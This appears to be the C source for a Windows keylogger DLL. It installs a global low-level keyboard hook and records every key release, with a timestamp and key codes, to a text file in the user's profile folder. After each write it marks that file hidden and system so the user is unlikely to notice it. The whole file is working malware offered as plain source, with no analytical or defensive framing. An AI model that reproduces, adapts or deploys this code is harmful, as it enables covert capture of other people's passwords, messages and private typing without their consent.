#include <windows.h>
#include <shlobj.h>
#include <stdio.h>
#define WIN32_LEAN_AND_MEAN
#pragma data_seg("SHARED") // dll crap for hooking other processes
#pragma comment(linker, "/SECTION:SHARED,RWS")
HHOOK hhk = NULL;
HINSTANCE hinst = NULL;
#pragma data_seg()


LRESULT CALLBACK  LowLevelKeyboardProc(int code,WPARAM wParam,LPARAM lParam);
void writelogs(char  *data, DWORD vkcode, DWORD scancode);
// only visual studio has the make_dword macro, so this is for cross compilers
DWORD make_dword( WORD lo, WORD hi )
{
return ( ( DWORD )hi << 16 ) | lo;
}
__declspec(dllexport) void install() 
{
// a 0 instead of a thread id for a global hook
hhk = SetWindowsHookEx(WH_KEYBOARD_LL, LowLevelKeyboardProc, hinst,0);
}
__declspec(dllexport) void uninstall() 
{
UnhookWindowsHookEx(hhk);
}
BOOL WINAPI DllMain(HINSTANCE hinstDLL,DWORD fdwReason,LPVOID lpvReserved) 
{
 hinst = hinstDLL;
 return TRUE;
}
LRESULT CALLBACK  LowLevelKeyboardProc(int code,WPARAM wParam,LPARAM lParam)
{	
	if (code < 0)
	{
    return CallNextHookEx(NULL, code, wParam, lParam);
	}
	if(wParam == WM_KEYUP)
	{	
		KBDLLHOOKSTRUCT *lol = (KBDLLHOOKSTRUCT *)lParam;
		char wut[50];
	    GetKeyNameText(lol->scanCode << 16,wut,sizeof(wut));
		writelogs(wut,lol->vkCode,lol->scanCode);
	}
	return CallNextHookEx(hhk, code, wParam, lParam);
}
void writelogs(char  *data, DWORD vkcode, DWORD scancode)
{
	// time crap 
	char buf[200];
	SYSTEMTIME st;
	GetLocalTime( &st );
    sprintf(buf,"%02d/%02d/%02d %02d:%02d:%02d",st.wYear, st.wMonth, st.wDay,st.wHour, st.wMinute, st.wSecond);
	// file crap
	FILE *lolfile; 
	ITEMIDLIST* pidl;
	char lpPath[MAX_PATH], path2[MAX_PATH];
	HRESULT hRes = SHGetSpecialFolderLocation( NULL, CSIDL_PROFILE, &pidl );
	if  SUCCEEDED(hRes) {
	SHGetPathFromIDList( pidl, lpPath );
	sprintf(path2,"%s\\stuff.txt",lpPath);
	}
	lolfile = fopen(path2,"a+");
	if(lolfile!=NULL)
	{
	fprintf(lolfile,"At %s key pressed is: %s , Scan code is %u and vkcode is %u \r\n",buf,data,vkcode,scancode);
	fclose(lolfile);
	SetFileAttributes(path2,0x2|0x4); // set file to hidden
	}
	else
	{
		return;
	}
	
}
